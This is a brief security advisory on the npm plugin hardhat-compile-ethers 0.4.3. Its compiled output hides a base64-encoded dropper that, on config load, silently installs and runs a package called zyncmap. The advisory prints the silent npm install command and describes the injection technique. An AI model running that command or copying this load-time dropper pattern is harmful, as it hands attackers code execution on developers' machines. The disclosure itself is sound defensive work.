summary: hardhat-compile-ethers 0.4.3 drops and executes attacker-controlled npm package on plugin load
details: When this Hardhat plugin is required from hardhat.config (load-time), top-level code in dist/src/index.js base64-decodes a shell command and a module name, spawns `npm install zyncmap --no-save --silent --no-audit --no-fund`, then requires the freshly installed `zyncmap` package and invokes its `getPlugin()()` export. The base64-hidden command string and module name are present only in the compiled dist/src/index.js and absent from the TypeScript source src/index.ts, indicating the dropper was injected post-build. The result is arbitrary code execution under the developer's account whenever the Hardhat config is loaded (e.g., `hardhat compile`, `hardhat test`, IDE plugin resolution).

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
